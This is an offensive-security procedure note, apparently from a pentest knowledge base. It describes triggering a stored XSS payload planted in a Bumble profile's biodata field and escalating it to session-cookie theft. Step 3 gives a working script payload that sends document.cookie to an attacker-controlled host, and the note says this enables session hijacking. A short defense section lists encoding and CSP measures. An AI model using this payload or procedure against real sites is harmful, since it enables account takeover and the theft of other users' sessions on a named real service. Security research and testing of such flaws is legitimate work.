---
tags:
  - xss
  - execution
  - cookie-theft
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8063250f-164d-4809-857d-31ba5dae234d
created_at: '2025-12-14T03:15:10.382Z'
updated_at: '2025-12-14T03:15:10.382Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Observe-XSS-Payload-Execution-on-Profile-View

## Summary

This procedure observes the execution of the stored XSS payload when a victim views the tampered Bumble profile, demonstrating JavaScript execution and potential for stealing session cookies.

## Description

Once injected, the payload in the biodata field is reflected without encoding when profiles are loaded in viewers' browsers. This leads to arbitrary JS execution in the victim's context, allowing actions like alerting for POC or exfiltrating `document.cookie` to an attacker-controlled server. The attack relies on social engineering to get views or natural profile browsing in the dating app environment.

## Requirements

1. Tampered profile with stored payload from prior injection
2. Victim browser or secondary account to simulate viewing
3. Attacker server (e.g., webhook site) for exfiltration testing
4. Browser dev tools for monitoring execution

## Defense

Defensive measures and detection strategies:

- Enforce output encoding (e.g., HTML entity encoding) on biodata rendering
- Use strict CSP headers to prevent script execution
- Log and alert on JS errors or unexpected network requests from profiles

## Objectives

1. Trigger payload execution in a non-attacker browser context
2. Capture proof of execution (e.g., alert or network log)
3. Demonstrate impact via cookie theft simulation

## Instructions

### Step 1: Simulate Profile View

**Context**: Load the tampered profile in a victim-like browser session.

Log in with a secondary account or incognito mode. Search for or navigate to the attacker's profile to trigger biodata rendering.

### Step 2: Monitor Execution

**Context**: Observe JS running in the viewer's DOM.

Open dev tools (F12) on the Network and Console tabs. Upon profile load, watch for alert pop-up or console errors indicating script execution.

> Expected: Alert box appears with 'XSS', or console logs the payload firing.

### Step 3: Test Exfiltration

**Context**: Upgrade POC to real impact by stealing cookies.

Replace payload with `<script>var img = new Image(); img.src='https://attacker.com/log?data='+encodeURIComponent(document.cookie);</script>`. Re-inject if needed, then view profile again. Check attacker server logs for incoming cookie data.

> Expected: HTTP request to attacker domain with session cookies, enabling hijacking.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[Exfiltration]]
